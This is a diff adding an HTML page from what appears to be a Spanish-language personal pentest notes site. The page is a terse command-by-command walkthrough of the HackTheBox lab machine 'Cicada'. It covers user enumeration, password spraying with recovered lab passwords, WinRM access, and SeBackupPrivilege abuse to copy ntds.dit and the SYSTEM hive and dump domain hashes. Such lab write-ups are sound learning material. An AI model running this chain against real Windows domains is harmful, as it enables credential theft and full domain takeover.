@@ -1,0 +1,114 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>M0B notes</title>
+  <meta name="description" content="&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;impacket-lookupsid anonymous@cicada.htb &lt;span class=&quot;nt&quot;&gt;-target-ip&lt;/span&gt; 10.10.11.35 &lt;span class=&quot;nt&quot;&gt;-no-pass&lt;/span&gt; | &lt;span class=&quot;nb&quot;&gt;grep &lt;/span&gt;SidTypeUser | &lt;span class=&quot;nb&quot;&gt;tr&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&#39;\\&#39;&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&#39; &#39;&lt;/span&gt; | &lt;span class=&quot;nb&quot;&gt;awk&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&#39;{print $3}&#39;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; validUsers.txt&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;">
+  <link rel="stylesheet" href="/assets/css/style.css">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link rel="icon" href="/M0B.png" type="image/png">
+  <style>
+    /* fallback si la hoja no carga */
+    body{background:#000;color:#e6e6e6;font:16px/1.7 ui-monospace, SFMono-Regular, Menlo, Monaco, Consolas, "Liberation Mono", "Courier New", monospace}
+  </style>
+  
+  <script defer src="/assets/js/copy-code.js"></script>
+</head>
+<body>
+  <header class="site-header">
+    <div class="site-brand">
+      <img class="brand-logo" src="/M0B.png" alt="logo" />
+      <div class="brand-title">M0B notes</div>
+    </div>
+    <nav class="site-nav">
+      <a href="/">Inicio</a>
+      <a href="/puertos/">Puertos</a>
+      <a href="/escalada/">Escalada</a>
+      <a href="/portswigger/">Portswigger</a>
+      <a href="/hackthebox/">HackTheBox</a>
+      <a href="/real_life/">Real Life</a>
+      <a href="/extras/">Extras</a>
+    </nav>
+  </header>
+
+  <main>
+    <div class="container">
+      <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>impacket-lookupsid anonymous@cicada.htb <span class="nt">-target-ip</span> 10.10.11.35 <span class="nt">-no-pass</span> | <span class="nb">grep </span>SidTypeUser | <span class="nb">tr</span> <span class="s1">'\\'</span> <span class="s1">' '</span> | <span class="nb">awk</span> <span class="s1">'{print $3}'</span> <span class="o">&gt;</span> validUsers.txt
+</code></pre></div></div>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>smbclient //10.10.11.35/HR <span class="nt">-N</span>
+get <span class="s2">"Notice from HR.txt"</span>
+</code></pre></div></div>
+
+<p><code class="language-plaintext highlighter-rouge">Default pass</code></p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Cicada$M6Corpb*@Lp#nZp!8
+</code></pre></div></div>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>netexec smb 10.10.11.35 <span class="nt">-u</span> validUsers.txt  <span class="nt">-p</span> <span class="s1">'Cicada$M6Corpb*@Lp#nZp!8'</span>
+</code></pre></div></div>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>michael.wrightson \ Cicada$M6Corpb*@Lp#nZp!8 
+</code></pre></div></div>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ldapdomaindump <span class="nt">-u</span> <span class="s1">'cicada.htb\michael.wrightson'</span> <span class="nt">-p</span> <span class="s1">'Cicada$M6Corpb*@Lp#nZp!8'</span> 10.10.11.35
+</code></pre></div></div>
+
+<p>La descripción de David Orelious contiene su pass</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>david.orelious \ aRt$Lp#7t*VQ!3
+</code></pre></div></div>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>smbclient //10.10.11.35/DEV <span class="nt">-U</span> david.orelious%<span class="s1">'aRt$Lp#7t*VQ!3'</span>
+
+get Backup_script.ps1
+</code></pre></div></div>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>emily.oscars \ Q!3@Lp#M6b*7t*Vt
+</code></pre></div></div>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>netexec winrm 10.10.11.35 <span class="nt">-u</span> <span class="s1">'emily.oscars'</span>  <span class="nt">-p</span> <span class="s1">'Q!3@Lp#M6b*7t*Vt'</span>
+</code></pre></div></div>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>evil-winrm <span class="nt">-i</span> 10.10.11.35 <span class="nt">-u</span> <span class="s1">'emily.oscars'</span>  <span class="nt">-p</span> <span class="s1">'Q!3@Lp#M6b*7t*Vt'</span>
+</code></pre></div></div>
+
+<h1 id="sebackupprivilegeserestoreprivilege">SeBackupPrivilege/SeRestorePrivilege</h1>
+
+<p><code class="language-plaintext highlighter-rouge">raj.dsh</code></p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>set context persistent nowriters
+add volume c: alias raj
+create
+expose %raj% z:
+</code></pre></div></div>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>unix2dos raj.dsh
+</code></pre></div></div>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>upload raj.dsh
+</code></pre></div></div>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">cd</span> <span class="nv">$env</span>:TEMP
+upload raj.dsh
+diskshadow /s raj.dsh
+robocopy /b z:<span class="se">\w</span>indows<span class="se">\n</span>tds <span class="nb">.</span> ntds.dit
+</code></pre></div></div>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>reg save hklm<span class="se">\s</span>ystem C:<span class="se">\U</span>sers<span class="se">\e</span>mily.oscars.CICADA<span class="se">\A</span>ppData<span class="se">\L</span>ocal<span class="se">\T</span>emp<span class="se">\s</span>ystem.hive
+</code></pre></div></div>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>download system.hive
+download ntds.dit
+</code></pre></div></div>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>impacket-secretsdump <span class="nt">-ntds</span> ntds.dit <span class="nt">-system</span> system.hive <span class="nb">local</span>
+</code></pre></div></div>
+
+      <div class="footer">
+        <span class="muted">© 2025 · Generado con Jekyll</span>
+      </div>
+    </div>
+  </main>
+</body>
+</html>
+
